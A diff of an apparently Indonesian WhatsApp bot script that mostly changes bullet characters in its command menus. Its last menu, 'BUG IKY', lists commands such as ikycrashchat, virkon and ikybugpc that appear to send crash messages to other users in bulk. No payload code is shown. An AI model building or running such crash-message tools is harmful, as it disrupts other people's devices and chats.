+│➣ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
+│➣ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
+│➣ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
+│➣ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
+│➣ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
+│➣ ${prefix}𝚜𝚙𝚊𝚌𝚎
+│➣ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
+│➣ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
+│➣ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
+│➣ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
+│➣ ${prefix}𝚋𝚎𝚛𝚛𝚢
+│➣ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
+│➣ ${prefix}𝚖𝚊𝚐𝚖𝚊
+│➣ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
+│➣ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
+│➣ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
+│➣ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
+│➣ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
+│➣ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
+│➣ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
+│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+│➣ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
+│➣ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
+│➣ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
+│➣ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
+│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+│➣ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3908,18 +3898,18 @@ break
 │◪〘EPHITOOXY MENU〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
-│➳ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
-│➳ ${prefix}𝚜𝚖𝚘𝚔𝚎
-│➳ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
-│➳ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
-│➳ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
-│➳ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
-│➳ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
-│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
-│➳ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
+│➣ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
+│➣ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
+│➣ ${prefix}𝚜𝚖𝚘𝚔𝚎
+│➣ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
+│➣ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
+│➣ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
+│➣ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
+│➣ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
+│➣ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
+│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+│➣ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3936,15 +3926,15 @@ break
 │ ◪〘 EPHOTO MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
-│➳ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
-│➳ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
-│➳ ${prefix}𝚐𝚕𝚊𝚜𝚜
-│➳ ${prefix}𝚗𝚎𝚘𝚗
-│➳ ${prefix}𝚋𝚎𝚊𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
-│➳ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+│➣ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
+│➣ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
+│➣ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
+│➣ ${prefix}𝚐𝚕𝚊𝚜𝚜
+│➣ ${prefix}𝚗𝚎𝚘𝚗
+│➣ ${prefix}𝚋𝚎𝚊𝚌𝚑
+│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+│➣ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+│➣ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3961,20 +3951,20 @@ break
 │    ◪〘 FUN MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚒𝚖𝚒𝚑
-│➳ ${prefix}𝚑𝚊𝚕𝚊𝚑
-│➳ ${prefix}𝚑𝚒𝚕𝚒𝚑
-│➳ ${prefix}𝚑𝚞𝚕𝚞𝚑
-│➳ ${prefix}𝚑𝚎𝚕𝚎𝚑
-│➳ ${prefix}𝚑𝚘𝚕𝚘𝚑
-│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
-│➳ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
-│➳ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
-│➳ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
-│➳ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
-│➳ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
-│➳ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
+│➣ ${prefix}𝚜𝚒𝚖𝚒𝚑
+│➣ ${prefix}𝚑𝚊𝚕𝚊𝚑
+│➣ ${prefix}𝚑𝚒𝚕𝚒𝚑
+│➣ ${prefix}𝚑𝚞𝚕𝚞𝚑
+│➣ ${prefix}𝚑𝚎𝚕𝚎𝚑
+│➣ ${prefix}𝚑𝚘𝚕𝚘𝚑
+│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
+│➣ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
+│➣ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
+│➣ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
+│➣ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
+│➣ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
+│➣ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3991,36 +3981,36 @@ break
 │ ◪〘 PRIMBON MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
-│➳ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
-│➳ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
-│➳ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
-│➳ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
-│➳ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
-│➳ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
-│➳ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
-│➳ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
-│➳ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
-│➳ ${prefix}𝚗𝚊𝚜𝚒𝚋
-│➳ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
-│➳ ${prefix}𝚝𝚊𝚛𝚘𝚝
-│➳ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
-│➳ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
-│➳ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
-│➳ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚠𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
-│➳ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➳ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
-│➳ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
-│➳ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
-│➳ ${prefix}𝚜𝚑𝚒𝚘
+│➣ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
+│➣ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
+│➣ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
+│➣ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
+│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
+│➣ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
+│➣ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
+│➣ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
+│➣ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
+│➣ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
+│➣ ${prefix}𝚗𝚊𝚜𝚒𝚋
+│➣ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
+│➣ ${prefix}𝚝𝚊𝚛𝚘𝚝
+│➣ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
+│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
+│➣ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
+│➣ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
+│➣ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚠𝚎𝚝𝚘𝚗
+│➣ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
+│➣ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+│➣ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
+│➣ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
+│➣ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
+│➣ ${prefix}𝚜𝚑𝚒𝚘
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4037,23 +4027,23 @@ break
 │◪〘 CONVERT MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚊𝚝𝚝𝚙
-│➳ ${prefix}𝚝𝚝𝚙
-│➳ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
-│➳ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
-│➳ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
-│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
-│➳ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
-│➳ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
-│➳ ${prefix}𝚝𝚘𝚐𝚒𝚏
-│➳ ${prefix}𝚝𝚘𝚞𝚛𝚕
-│➳ ${prefix}𝚝𝚘𝚟𝚗
-│➳ ${prefix}𝚝𝚘𝚖𝚙3
-│➳ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
-│➳ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
-│➳ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
-│➳ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
-│➳ ${prefix}𝚜𝚖𝚎𝚖𝚎
+│➣ ${prefix}𝚊𝚝𝚝𝚙
+│➣ ${prefix}𝚝𝚝𝚙
+│➣ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
+│➣ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
+│➣ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
+│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
+│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
+│➣ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
+│➣ ${prefix}𝚝𝚘𝚐𝚒𝚏
+│➣ ${prefix}𝚝𝚘𝚞𝚛𝚕
+│➣ ${prefix}𝚝𝚘𝚟𝚗
+│➣ ${prefix}𝚝𝚘𝚖𝚙3
+│➣ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
+│➣ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
+│➣ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
+│➣ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}𝚜𝚖𝚎𝚖𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4070,16 +4060,16 @@ break
 │   ◪〘 MAIN MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚒𝚗𝚐
-│➳ ${prefix}𝚘𝚠𝚗𝚎𝚛
-│➳ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
-│➳ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
-│➳ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
-│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
-│➳ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
+│➣ ${prefix}𝚙𝚒𝚗𝚐
+│➣ ${prefix}𝚘𝚠𝚗𝚎𝚛
+│➣ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
+│➣ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
+│➣ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
+│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
+│➣ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4096,14 +4086,14 @@ break
 │◪〘 DATABASE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
-│➳ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
-│➳ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
-│➳ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
-│➳ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
-│➳ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
+│➣ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
+│➣ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
+│➣ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
+│➣ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
+│➣ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
+│➣ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4120,10 +4110,10 @@ break
 │ ◪〘 ANONYM MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
-│➳ ${prefix}𝚜𝚝𝚊𝚛𝚝
-│➳ ${prefix}𝚗𝚎𝚡𝚝
-│➳ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
+│➣ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
+│➣ ${prefix}𝚜𝚝𝚊𝚛𝚝
+│➣ ${prefix}𝚗𝚎𝚡𝚝
+│➣ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4140,11 +4130,11 @@ break
 │ ◪〘 ISLAMIC MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚒𝚚𝚛𝚊
-│➳ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
-│➳ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
-│➳ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
-│➳ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
+│➣ ${prefix}𝚒𝚚𝚛𝚊
+│➣ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
+│➣ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
+│➣ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
+│➣ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4161,17 +4151,17 @@ break
 │  ◪〘 VOICE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚋𝚊𝚜𝚜
-│➳ ${prefix}𝚋𝚕𝚘𝚠𝚗
-│➳ ${prefix}𝚍𝚎𝚎𝚙
-│➳ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
-│➳ ${prefix}𝚏𝚊𝚜𝚝
-│➳ ${prefix}𝚏𝚊𝚝
-│➳ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
-│➳ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
-│➳ ${prefix}𝚛𝚘𝚋𝚘𝚝
-│➳ ${prefix}𝚜𝚕𝚘𝚠
-│➳ ${prefix}𝚝𝚞𝚙𝚊𝚒
+│➣ ${prefix}𝚋𝚊𝚜𝚜
+│➣ ${prefix}𝚋𝚕𝚘𝚠𝚗
+│➣ ${prefix}𝚍𝚎𝚎𝚙
+│➣ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
+│➣ ${prefix}𝚏𝚊𝚜𝚝
+│➣ ${prefix}𝚏𝚊𝚝
+│➣ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
+│➣ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
+│➣ ${prefix}𝚛𝚘𝚋𝚘𝚝
+│➣ ${prefix}𝚜𝚕𝚘𝚠
+│➣ ${prefix}𝚝𝚞𝚙𝚊𝚒
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4189,17 +4179,17 @@ break
 │ ◪〘 OWNER MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
-│➳ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
-│➳ ${prefix}𝚕𝚎𝚊𝚟𝚎
-│➳ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
-│➳ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
-│➳ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
+│➣ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
+│➣ ${prefix}𝚕𝚎𝚊𝚟𝚎
+│➣ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
+│➣ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
+│➣ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4213,119 +4203,112 @@ break
  if (!isCreator && !isBan) return
 jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky1.mp3'), mimetype: 'audio/mpeg', ptt:true })
  anu = `
-██▀░░░░░░░░░░░░░▀██
-█│░░░░░░░░░░░░░░░│█
-▌│░░░░░░░░░░░░░░░│▐
-░└┐░░░░░░░░░░░░░┌┘░
-░░└┐░░░░░░░░░░░┌┘░░
-░░┌┘▄▄▄░░░░░▄▄▄└┐░░
-▌░│████▌░░░▐████│░▐
-█░│▐██▀░░▄░░▀██▌│░█
-█▌┘░░░░░▐█▌░░░░░└▐█
-██░░▄▄▓░▀█▀░▓▄▄░░██
-██▄─┘█▌░░░░░▐█└─▄██
-███░░▐─┬┬┬┬┬─▌░░███
-███▌░░┬┼┼┼┼┼┬░░▐███
-████▄░└┴┴┴┴┴┘░▄████
-█████▄░░░░░░░▄█████
-▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+▇◤▔▔▔▔▔▔▔◥▇
+▇▏◥▇◣┊◢▇◤▕▇
+▇▏▃▆▅▎▅▆▃▕▇
+▇▏╱▔▕▎▔▔╲▕▇
+▇◣◣▃▅▎▅▃◢◢▇
+▇▇◣◥▅▅▅◤◢▇▇
+▇▇▇◣╲▇╱◢▇▇▇ 
 ╭─────────────────╮
-│     ◪〘 BUG IKY 〙◪
+│     ⸸‎〘 BUG IKY 〙⸸‎
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}poll
-│➳ ${prefix}polliky
-│➳ ${prefix}bokep
-│➳ ${prefix}ikysantet
-│➳ ${prefix}ikydocnopayment
-│➳ ${prefix}ikyinfinite
-│➳ ${prefix}ikycrashchat
-│➳ ${prefix}ikymakerzcrash
-│➳ ${prefix}ikycrashnopayment
-│➳ ${prefix}ikycrashpakepayment
-│➳ ${prefix}ikynomercy
-│➳ ${prefix}ikycrashemoji
-│➳ ${prefix}ikycrashtitik
-│➳ ${prefix}ikymakerztravazap (jumlah) 
-│➳ ${prefix}ikymakerzcrashhuhu (jumlah) 
-│➳ ${prefix}kintil (jumlah)
-│➳ ${prefix}peler (jumlah)
-│➳ ${prefix}pelerpakepayment (jumlah) 
-│➳ ${prefix}ikypay (jumlah)
-│➳ ${prefix}ikytrol (jumlah)
-│➳ ${prefix}ikytrolii (jumlah)
-│➳ ${prefix}kontol (jumlah)
-│➳ ${prefix}kuntul (jumlah)
-│➳ ${prefix}ikydocu (jumlah)
-│➳ ${prefix}ikyhello (jumlah)
-│➳ ${prefix}virkon (jumlah) 
-│➳ ${prefix}ikylokas (jumlah)
-│➳ ${prefix}monyet (jumlah)
-│➳ ${prefix}ikymomo (jumlah)
-│➳ ${prefix}ikybugpc (jumlah)
-│➳ ${prefix}ikybugvn (jumlah)
